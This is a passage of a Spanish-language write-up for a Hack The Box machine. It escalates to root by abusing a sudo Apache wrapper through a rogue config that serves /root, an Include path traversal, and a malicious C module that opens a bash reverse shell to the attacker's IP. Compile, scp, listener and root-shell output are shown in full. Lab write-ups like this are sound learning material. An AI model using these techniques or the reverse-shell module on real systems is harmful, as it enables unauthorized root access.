Si no se cumple la condición, arroja un error indicando que la configuración se encuentra fuera de la ruta permitida y retorna `1`

### 1. Web Server

Como se trata de abusar de un archivo de configuración de `apache2`, por supuesto que podemos montar un servidor web malicioso que contemple los archivos de la ruta `/root`.

> El siguiente archivo corresponde a una configuración funcional que levante un servidor web en el puerto `5000`
{: .notice--warning}

``` bash
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so

Listen 5000

DocumentRoot "/root"
ServerName test
<Directory "/root">
    Options Indexes
    Require all granted
</Directory>

ErrorLog /tmp/apache_error.log
PidFile /tmp/apache.pid
```

Ahora procederemos a cargar la configuración del servidor web malicioso. De forma totalmente inmediata, intentaremos hacer una solicitud a la flag `root.txt`

``` bash
mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl -f confs/evil.conf

mark@guardian:~$ curl localhost:5000/root.txt # de forma inmediata
785...
```

### 2. Path Traversal

La función `starts_with()` solamente comprueba si la ruta comienza con `/home/marks`. Por lo que teóricamente podemos eludir este filtro realizando un recorrido de directorio (`Path Traversal`) para leer un archivo del sistema.

De esta forma podríamos leer cualquier archivo porque estamos aprovechando los privilegios `sudo`

``` bash
mark@guardian:~/confs$ cat evil.conf
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

Include /home/mark/confs/../../../root/root.txt
```

Ahora ejecutaremos el binario pasando la configuración con `-f`, veremos que muestra un error, pero efectivamente carga el contneido del archivo de la flag

``` bash
mark@guardian:~/confs$ sudo /usr/local/bin/safeapache2ctl -f ./evil.conf
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command '785...', perhaps misspelled or defined by a module not included in the server configuration
Action '-f /home/mark/confs/evil.conf' failed.
The Apache error log may have more information.
```

### 3. Evil Module

> Las vías anteriores para completar la máquina me parecieron un poco simplistas y no contemplan del todo un acceso completo al sistema (aunque según hasta donde ví, hay más formas de explotar este paso).
> 
> Es por eso que quise invesitgar un poco más (le pregunté a `Perplexity`) y desubrí (me lo sugirió la IA) que puede usarse un módulo propio para ejecutar un comando a nivel de sistema. ([`artcprogramming-es`](https://artcprogramming-es.blogspot.com/2012/11/el-ultimo-apache-ii-el-regreso.html)). 
{: .notice}

El siguiente código en C contiene una instrucción maliciosa, en este caso ejecuta una reverse shell hacia nuestra IP por un puerto

``` c
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h> 

__attribute__((constructor)) void init(){  
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'");  
    exit(0);  
}
```

Compilaremos este código como una librería compartida con `gcc`. Este `.so` resultante será nuestro módulo malicioso

``` bash
gcc -shared -fPIC -o evil.so evil.c
```

Copiaremos este módulo en alguna ruta del sistema en la máquina víctima, por ejemplo en `/tmp`.

> Personalmente recomiendo la transferencia de archivos con `scp` (`Secure Copy Protocol`).
{: .notice}

``` bash
scp -i mark -oStrictHostKeyChecking=no evil.so mark@guardian.htb:/tmp
```


## Root Time

Cargaremos la siguiente configuración maliciosa en el directorio `confs` para que pueda ser procesada por el `wrapper`. 

> Debemos especificar la ruta donde alojamos nuestra librería compartida maliciosa.
{: .notice--danger}

En esta configuración, cargamos el módulo `mod_mpm_worker` para cumplir con lo que el `wrapper` valida

``` bash
mark@guardian:~$ cat confs/evil.conf
LoadModule mpm_worker_module /usr/lib/apache2/modules/mod_mpm_worker.so

LoadModule evil /tmp/evil.so
```

> Iniciaremos un listener en nuestra máquina atacante por el puerto que especificamos en el código del módulo, en este caso el `443`: `nc -lvnp 443`.
{: .notice--danger}

Ahora ejecutaremos el `wrapper` con `sudo` y con el parámetro `-f` haciendo referencia a la configuración que acabamos de crear

``` bash
mark@guardian:~$ sudo safeapache2ctl -f ./confs/evil.conf 
Terminated
Action '-f /home/mark/confs/evil.conf' failed.
The Apache error log may have more information.
```

Desde nuestro listener recibiremos una consola como el usuario `root`

``` bash
Connection from 10.129.237.248:40984
root@guardian:/home/mark# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@guardian:/home/mark# cat /root/root.txt
cat /root/root.txt 
785...
```

Gracias por leer, a continuación te dejo la cita del día.

> You're not obligated to win. You're obligated to keep trying to do the best you can every day.
> — Marian Edelman
{: .notice}
